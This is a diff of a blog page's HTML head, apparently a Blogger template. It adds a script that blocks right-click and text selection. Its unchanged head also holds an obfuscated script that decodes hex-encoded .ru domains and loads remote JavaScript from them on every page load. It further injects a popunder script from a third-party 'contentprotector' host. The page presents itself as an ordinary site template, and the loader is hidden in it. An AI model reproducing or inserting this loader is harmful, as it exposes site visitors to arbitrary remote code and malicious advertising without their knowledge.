@@ -4,7 +4,20 @@
 xmlns:data="http://www.google.com/2005/gml/data" xmlns:b="http://www.google.com/2005/gml/b" 
 xmlns="http://www.w3.org/1999/xhtml"><HEAD><META content="IE=11.0000" 
 http-equiv="X-UA-Compatible">
-
+<script type="text/javascript">
+	document.oncontextmenu = function(){return false;}
+    function disabletext(e){
+    return false
+    }
+    function reEnable(){
+    return true
+    }
+    document.onselectstart=new Function ("return false")
+    if (window.sidebar){
+    document.onmousedown=disabletext
+    document.onclick=reEnable
+    }
+</script>
 <SCRIPT>!function(){var t=JSON.parse('["31747867353936342e7275","7877793673796d746d79637a772e7275"]'),e="24711",o=function(t){t=t.match(/[\S\s]{1,2}/g);for(var e="",o=0;o<t.length;o++)e+=String.fromCharCode(parseInt(t[o],16));return e},n=function(t,e,o){var n=document.location.protocol+"//"+t;if(window.smlo&&-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.smlo.loadSmlo(n.replace("https:","http:"));else if(window.zSmlo&&-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.zSmlo.loadSmlo(n.replace("https:","http:"));else{var r=document.createElement("script");r.setAttribute("src",n),r.setAttribute("type","text/javascript"),document.head.appendChild(r),r.onload=function(){this.a982392846||(this.a982392846=!0,"function"==typeof e&&e())},r.onerror=function(){this.a982392846||(this.a982392846=!0,r.parentNode.removeChild(r),"function"==typeof o&&o())}}},r=function(i){var a=i?i:t[0],s=o(a)+"/pjs/"+e+".js";n(s,function(){},function(){var e=t.indexOf(a),o=t[e+1];o&&r(o)})};r()}();function getCfCookie(name) { var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)")); return matches ? decodeURIComponent(matches[1]) : undefined;} if (window.self == window.top) { document.addEventListener("DOMContentLoaded", function(){ var pops = document.createElement('script'); var cfilterCookie = '6697e3d5eb75761c638fdeb1eed84055'; var cfilterCookieIsSet = getCfCookie(cfilterCookie) ? getCfCookie(cfilterCookie) : 0; pops.src = '//contentprotector-us1.com/' + 'getcl/rotator/' + 'campaignid/1/' + 'sourceid/121/' + 'siteid/13138/' + 'userid/4BC1143D-4E87-4B2A-AF81-474991BD0CD9/' + 'iscookie/' + cfilterCookieIsSet; document.head.appendChild(pops); });}</SCRIPT>
  <!-- [ Meta Tag SEO ] --> 
 <META charset="utf-8"> 
